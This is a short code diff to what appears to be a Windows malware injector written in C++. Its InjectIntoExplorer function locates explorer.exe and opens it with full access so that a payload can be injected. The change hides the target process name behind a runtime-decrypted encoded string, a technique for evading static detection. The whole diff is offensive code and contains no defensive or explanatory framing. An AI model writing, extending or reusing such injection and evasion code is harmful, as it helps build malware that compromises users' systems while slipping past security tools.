@@ -1,5 +1,6 @@
 #include "Injector.h"
 #include "../utils/Logger.h"
+#include "../utils/Obfuscator.h"
 #include <tlhelp32.h>
 #include <algorithm>
 #include <cwctype>
@@ -123,7 +124,8 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
 }
 
 bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload) {
-    DWORD pid = GetProcessIdByName(L"explorer.exe");
+    // "explorer.exe"
+    DWORD pid = GetProcessIdByName(utils::DecryptW(L"\x3f\x22\x2a\x36\x35\x28\x3f\x22\x54\x31\x2c\x31"));
     if (pid == 0) return false;
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
